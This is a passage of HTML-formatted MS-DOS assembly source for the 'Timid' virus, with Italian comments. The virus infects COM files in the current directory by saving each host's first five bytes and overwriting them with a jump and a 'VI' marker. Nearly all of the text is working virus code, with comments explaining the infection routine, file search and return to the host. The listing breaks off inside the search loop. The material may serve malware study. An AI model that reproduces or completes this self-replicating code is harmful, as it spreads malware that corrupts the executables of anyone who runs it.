color:#CCFFFF'>;***********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;* Virus Timid<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;* Infetta solo files COM. Prende i primi 5 bytes del suo COM
ospitante salvandoli<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;* quindi inserisce nell'host un'istruzione jump assieme alle
lettere &quot;VI&quot;, che<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;* sono usate dal virus per l'identificazione.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;*<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;***********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>MAIN SEGMENT BYTE <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>ASSUME CS:MAIN,DS:MAIN,SS:NOTHING <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ORG 100H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; Questo host e' una shell di un programmino che immette il
virus nel sistema.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; tutto quello che fa e' un jump alla routine del virus, che fa
il suo lavoro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; e ritorna ad esso, il quale poi rilascia il controllo al DOS.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>HOST: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>jmp NEAR PTR
INIZIO_VIRUS ;il MASM non assembla questo jmp correttamente<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>db 'VI'<span
style="mso-spacerun: yes">                 </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov ah,4CH <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov al,0 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>int 21H<span
style="mso-spacerun: yes">                  </span>;rilascia il controllo al
DOS <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>VIRUS:<span
style="mso-spacerun: yes">                   </span>;label per il primo byte
del codice virus <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>COMFILE DB
'*.COM',0<span style="mso-spacerun: yes">     </span>;stringa di ricerca: solo
files COM<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>INIZIO_VIRUS: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>call GET_START<span
style="mso-spacerun: yes">           </span>;fornisce l'indirizzo start <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*******************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; trucco per determinare la locazione dell'inizio del codice
virale. Inserisco<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; l'indirizzo di GET_START nello stack con l'istruzione call,
dove sara' ricoperto<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; dalla variabile VIR_START. Sottraggo poi gli indirizzi per
ottenere @VIRUS <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;*******************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>GET_START: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>sub
WORD PTR [VIR_START],OFFSET GET_START ­ OFFSET VIRUS <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; questo spostamento della DTA e' necessario perche' la routine
di ricerca del file ; COM da infettare modifichera' la DTA corrente.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov dx,OFFSET
DTA<span style="mso-spacerun: yes">        </span>;mette la DTA alla fine del
codice virus per ora <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov ah,1AH<span
style="mso-spacerun: yes">               </span>;funzione 1A<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>int 21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>call TROVA_FILE<span
style="mso-spacerun: yes">  </span><span style="mso-spacerun:
yes">          </span>;cerca un file da infettare <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>jnz ESCI_VIRUS<span
style="mso-spacerun: yes">             </span>;ritorna nz ­ non ci sono files
da infettare, esci <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>call INFETTA<span
style="mso-spacerun: yes">               </span>;ci sono files COM... infetta <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov dx,OFFSET
FNAME<span style="mso-spacerun: yes">        </span>;mostra il nome del file
appena infettato <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov WORD PTR
[HANDLE],24H<span style="mso-spacerun: yes">  </span>;la stringa deve terminare
con w/ '$' <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov ah,9<span
style="mso-spacerun: yes">                   </span>; funzione 9: stampa la
stringa a video <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>int 21H<span
style="mso-spacerun: yes">                    </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ESCI_VIRUS: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; la routine principale passa il controllo al programma host.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; 1) ripristino la DTA al suo valore iniziale (indirizzo 80h)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov dx,80H<span
style="mso-spacerun: yes">                </span>;stabilisco l'indirizzi della
DTA cosi' il prog.host<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov ah,1AH<span
style="mso-spacerun: yes">                </span>;non fa confusione scrivendoci
sopra<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>int 21H<span
style="mso-spacerun: yes">                   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; 2) muovo i bytes che erano originariamente i primi del suo
host ospitante <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<span style="mso-spacerun: yes">    </span>prendendoli
dall'area dati STAR_CODE e li rimetto all'indirizzo 100h. VIR_START <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<span style="mso-spacerun: yes">    </span>contiene l'indirizzo
assoluto del primo byte del virus nel segmento di <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<span style="mso-spacerun: yes">    </span>programma VIRUS.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov
bx,[VIR_START]<span style="mso-spacerun: yes">        </span>;in bx indirizzo
di partenza del virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; metto in ax i primi dye bytes (WORD PTR) dopo l'indirizzo di
INIZIO_CODICE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov ax,WORD PTR [bx+(OFFSET INIZIO_CODICE)­(OFFSET VIRUS)] <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>mov WORD PTR
[HOST],ax<span style="mso-spacerun: yes">     </span>;ora il primi due bytes
dopo INIZIO_CODICE sono in<span style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                                
</span></span></b><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;HOST <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>; leggo i due bytes successivi (WORD
PTR)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
ax,WORD PTR [bx+(OFFSET INIZIO_CODICE)­(OFFSET VIRUS)+2] <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; e li inserisco in HOST+2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov WORD PTR [HOST+2],ax <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; leggo il quinto e ultimo byte (BYTE PTR)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov al,BYTE PTR
[bx+(OFFSET INIZIO_CODICE)­(OFFSET VIRUS)+4] <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; e lo inserisco in HOST+4. All'inizio del file host ci sono i 5
bytes originari.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov BYTE PTR [HOST+4],al <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>mov
[VIR_START],100H<span style="mso-spacerun: yes">      </span>;indirizzo di
ritorno = 100h <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; 3) ripasso il controllo all'host. L'istruzione ret pulisce lo
stack<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>ret<span
style="mso-spacerun: yes">                       </span>;ritorna all’host <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;**********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; l'etichetta INIZIO_CODICE rappresenta l'indirizzo in cui
verranno salvati i primi<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; 5 bytes del COM host quando il codice virale sara' ospitato da
un COM su disco.<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; con il puntatore su INIZIO_CODICE, il virus eseguira' un INT21
40h (scrittura su<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; file), con dx=indirizzo START_IMAGE (che punta ai 5 bytes
iniziali del COM su<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; disco) e cx= 5, ricoprendo i 5 bytes del codice virale che e'
gia' stato appeso<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; al COM sul disco con i 5 bytes iniziali. Ogni file infettato
presente sul disco<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; conterra' nelle locazioni dopo INIZIO_CODICE i primi 5 bytes
salvati del COM <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; ospitante dato che i primi 5 bytes sono stati sostituiti con
un jump + 2 + 'V' + <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; 'I' che utilizzera' il virus per saltare al suo stesso codice
virale.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;**********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>INIZIO_CODICE:<span style="mso-spacerun:
yes">                       </span>;qui vengono copiati i primi 5 bytes
dall'host <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>nop<span
style="mso-spacerun: yes">                       </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>nop<span
style="mso-spacerun: yes">                       </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>nop <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>nop <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>nop <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;*******************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; TROVA_FILE:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; cerca un file COM che passa il test di FILE_OK (z=1 OK, z=1
NO_OK) <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; effettua una ricerca nella directory corrente <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;*******************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>TROVA_FILE: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
dx,[VIR_START] <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>mov cx,3FH<span
style="mso-spacerun: yes">                     </span>;cerca file con qualsisai
attributi<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov ah,4EH<span
style="mso-spacerun: yes">                     </span>;INT 21 funzione 4E:
cerca il primo file <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>int 21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>TROVA_LOOP: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; la funzione 4E ritorna un codice di errore in ax. Se il file
viene trovato<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; ax=0; altrimenti ax!=0. Effettuando un or di ax su se' stesso
verifichiamo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; se e' azzerato oppure no. Nel caso ax=0, or imposta il flag
z=1<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>or al,al<span
style="mso-spacerun: yes">                       </span>;in ax codice di errore
(al=1, flag zero=0)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>jnz TROVA_FATTO<span
style="mso-spacerun: yes">                </span>;z=0 non ci sono files <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>call FILE_OK<span style="mso-spacerun: yes">                  
</span>;z=1, ok c'e' un file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; FILE_OK ritorna z=1 se c'e' un file buono da infettare,
altrimenti torna z=0.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;nessun errore (al=0, flag zero=1)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>jz TROVA_FATTO<span
style="mso-spacerun: yes">                     </span>;ok ho trovato un file
valido, esco con z=1 <o:p></o:p></span></b></p>

